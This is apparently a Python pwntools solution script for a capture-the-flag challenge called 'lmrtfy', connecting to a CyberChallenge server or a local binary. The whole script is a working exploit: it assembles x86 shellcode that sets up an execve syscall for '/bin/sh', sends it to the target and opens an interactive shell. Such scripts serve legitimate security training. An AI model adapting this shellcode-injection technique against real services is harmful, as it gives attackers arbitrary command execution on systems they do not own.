#!/usr/bin/env python3

from pwn import *

exe = ELF("lmrtfy")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("lmrtfy.challs.cyberchallenge.it", 9124)

    return r


def main():
    r = conn()

    # good luck pwning :)

    r.recvline()

    syscall = p32(0x08049444)

    assembly = """
                xor ebx, ebx
                xor ecx, ecx
                xor edx, edx
                add eax, {} 
                mov ebx, eax
                mov eax, 0xb
                push 0x08049444
                ret
                nop
               """
    
    offset = len(assembly)
    shellcode = asm(assembly.format(23))
    print(len(shellcode))

    shellcode += b'/bin/sh\x00'

    r.sendline(shellcode)

    r.interactive()


if __name__ == "__main__":
    main()
